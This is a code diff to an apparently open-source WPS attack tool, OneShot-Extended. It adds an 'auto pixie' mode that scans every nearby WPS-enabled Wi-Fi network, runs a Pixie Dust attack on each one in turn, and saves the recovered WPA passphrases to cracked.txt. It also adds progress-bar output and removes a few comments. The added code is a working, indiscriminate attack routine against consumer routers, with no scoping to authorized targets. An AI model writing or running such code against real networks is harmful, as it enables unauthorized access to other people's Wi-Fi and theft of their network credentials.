@@ -31,6 +31,12 @@ import src.wps.bruteforce
 import src.utils
 import src.args
 
+from rich.console import Console
+from rich.panel import Panel
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
+
+_CONSOLE = Console()
+
 def checkRequirements():
     """Verify requirements are met"""
 
@@ -50,8 +56,6 @@ def checkRequirements():
 def setupDirectories():
     """Create required directories"""
 
-    # We recently changed the PIXIEWPS_DIR and SESSIONS_DIR path
-    # Rename older .OSE data dir to .OneShot-Extended, and maintain compatibility
     old_dir = os.path.expanduser('~/.OSE')
     new_dir = os.path.expanduser('~/.OneShot-Extended')
 
@@ -92,11 +96,94 @@ def scanForNetworks(interface: str, vuln_list: list[str]) -> tuple[str, dict] | 
     scanner = src.wifi.scanner.WiFiScanner(interface, vuln_list)
     return scanner.promptNetwork()
 
+def autoPixieAttack(interface: str, vuln_list_file: str):
+    """Scan all WPS networks and attack each with Pixie Dust."""
+
+    try:
+        with open(vuln_list_file, 'r', encoding='utf-8') as f:
+            vuln_list = f.read().splitlines()
+    except FileNotFoundError:
+        vuln_list = []
+
+    logger.info('Scanning for WPS-enabled networks...')
+    scanner = src.wifi.scanner.WiFiScanner(interface, vuln_list)
+    networks = scanner.getNetworks()
+
+    if not networks:
+        logger.error('No WPS networks found.')
+        return
+
+    scanner.displayNetworks(networks)
+
+    total = len(networks)
+    cracked = []
+
+    _CONSOLE.print(Panel(f'[bold cyan]Auto Pixie Attack[/bold cyan]\n'
+                         f'Found [bold]{total}[/bold] WPS networks. Starting attack...',
+                         border_style='cyan'))
+
+    connection = src.wps.connection.Initialize(interface)
+
+    try:
+        with Progress(
+            SpinnerColumn(),
+            TextColumn('[progress.description]{task.description}'),
+            BarColumn(),
+            TextColumn('[progress.percentage]{task.percentage:>3.0f}%'),
+            console=_CONSOLE,
+            transient=False,
+        ) as progress:
+            task = progress.add_task('[cyan]Attacking networks...', total=total)
+
+            for n, network in networks.items():
+                bssid = network['BSSID']
+                essid = network['ESSID']
+                progress.update(task, description=f'[cyan]({n}/{total}) {essid} ({bssid})')
+
+                try:
+                    success = connection.singleConnection(bssid, pin=None)
+                except Exception as e:
+                    logger.error(f'Error attacking {essid} ({bssid}): {e}')
+                    success = False
+
+                if success:
+                    psk = connection.CONNECTION_STATUS.WPA_PSK
+                    cracked.append((essid, bssid, psk))
+                    cracked_line = f'{essid}:{psk}'
+
+                    with open('cracked.txt', 'a', encoding='utf-8') as f:
+                        f.write(f'{cracked_line}\n')
+
+                    logger.success(f'Cracked {essid} — PSK: {psk}')
+
+                progress.advance(task)
+
+    except KeyboardInterrupt:
+        logger.info('Auto attack interrupted by user.')
+
+    _CONSOLE.print()
+    summary = (
+        f'[bold]Auto Pixie Attack Complete[/bold]\n'
+        f'[green]Cracked: {len(cracked)}/{total}[/green]\n'
+        f'Results saved to: [bold]cracked.txt[/bold]'
+    )
+
+    if cracked:
+        _CONSOLE.print(Panel(summary, border_style='green'))
+    else:
+        _CONSOLE.print(Panel(summary, border_style='yellow'))
+
+    del connection
+
 def handleConnection(args):
     """Main connection logic"""
 
     network_info = {}
     success = False
+
+    if args.auto_pixie:
+        autoPixieAttack(args.interface, args.vuln_list)
+        return
 
     if args.bruteforce:
         connection = src.wps.bruteforce.Initialize(args.interface)
@@ -134,7 +221,6 @@ def handleConnection(args):
                     args.pin
                 )
 
-            # Save to vulnerable list
             if success and args.pixie_dust and network_info:
                 src.utils.addVulnerableAP(network_info, args.vuln_list)
 
